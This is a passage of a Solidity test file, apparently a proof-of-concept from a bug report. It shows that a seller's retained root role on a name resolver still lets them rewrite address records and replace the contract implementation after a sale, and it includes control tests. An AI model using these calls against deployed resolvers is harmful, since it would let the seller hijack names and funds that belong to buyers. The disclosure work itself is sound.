    function test_seller_can_write_a_name_the_buyer_adds_afterwards() external {
        vm.prank(seller);
        resolver.setAddr(laterNode, COIN_TYPE_ETH, abi.encodePacked(seller));

        assertEq(
            resolver.addr(laterNode, COIN_TYPE_ETH),
            abi.encodePacked(seller),
            "a name never part of the transfer is writable too"
        );
        console.log("savings.bob.eth, pointed at this resolver later, is writable by the seller");
    }

    /// ROLE_UPGRADE is in the same bitmap and is only ever checked at root.
    function test_seller_can_replace_the_implementation() external {
        PermissionedResolver newImpl = new PermissionedResolver(address(this));
        vm.prank(seller);
        resolver.upgradeToAndCall(address(newImpl), "");
        console.log("seller replaced the implementation behind every name on the resolver");
    }

    /// CONTROL 1: the harness measures the role, not a permissive stub. An account that
    /// never received the grant cannot make the same call.
    function test_CONTROL_an_account_without_the_grant_cannot_write() external {
        vm.prank(stranger);
        vm.expectRevert();
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(stranger));
        console.log("CONTROL stranger cannot write the record");
    }

    /// CONTROL 2: the same call by the same account with the same arguments, after the
    /// root grant is taken away, reverts. So what the test above measured is the retained
    /// grant and nothing else.
    function test_CONTROL_revoking_the_root_grant_stops_the_same_call() external {
        vm.prank(seller);
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));

        vm.prank(seller);
        resolver.revokeRootRoles(EACBaseRolesLib.ALL_ROLES, seller);

        vm.prank(seller);
        vm.expectRevert();
        resolver.setAddr(soldNode, COIN_TYPE_ETH, abi.encodePacked(seller));
        console.log("CONTROL with the root grant revoked, the seller's write reverts");
    }
}
```

Bug found and verified by me. — Sikoh
